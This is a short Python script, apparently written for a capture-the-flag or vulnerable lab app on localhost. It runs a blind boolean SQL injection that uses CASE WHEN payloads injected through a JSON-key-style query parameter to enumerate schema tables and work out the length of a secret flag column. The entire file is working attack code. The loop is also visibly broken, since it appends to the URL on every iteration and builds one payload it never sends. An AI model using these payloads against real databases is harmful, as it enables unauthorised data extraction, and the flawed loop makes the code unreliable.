import requests
import time

url = "http://127.0.0.1:9000/post/"

id = 1
content_param = f"/?content="
content = "IS_FREE!"

work_payload = """
-\\>') AS "mydefinedname" FROM "vul_blog" WHERE 1=1 AND case when 
(SELECT length(string_agg(vul_flag.flag, '')) FROM vul_flag) < 20 
then true 
else false 
end GROUP BY "vul_blog"."title" LIMIT 1 offset 1 --
"""

schema_count_payload = """
-\\>') AS "mydefinedname" FROM "vul_blog" WHERE 1=1 AND case when 
(SELECT count(table_name) as cnt FROM information_schema.tables WHERE table_schema='public') > 2 
then true 
else false 
end  LIMIT 1 offset 1 --
"""


def exists_check(content):
    if "title" in str(content):
        return True
    else:
        return False


table_count = 0
table_count_get = False
while table_count_get is False:
    schema_count_payload = f"""
-\\>') AS "mydefinedname" FROM "vul_blog" WHERE 1=1 AND case when 
(SELECT count(table_name) as cnt FROM information_schema.tables WHERE table_schema='public') = {table_count} 
then true 
else false 
end  LIMIT 1 offset 1 --
"""
    work_payload = f"""
    -\\>') AS "custom_field" FROM "vul_blog" WHERE 1=1 AND case when 
    (SELECT length(string_agg(vul_flag.flag, '')) FROM vul_flag) < {table_count} 
    then true 
    else false 
    end GROUP BY "vul_blog"."title" LIMIT 1 offset 1 --
    """
    time.sleep(1)
    table_count = table_count + 1
    url = f"{url}{id}{content_param}{work_payload}"
    resp = requests.get(url=url)
    print(resp.content)
    print(exists_check(resp.content))
    if exists_check(resp.content):
        table_count = table_count - 1
        print(table_count)
        table_count_get = True
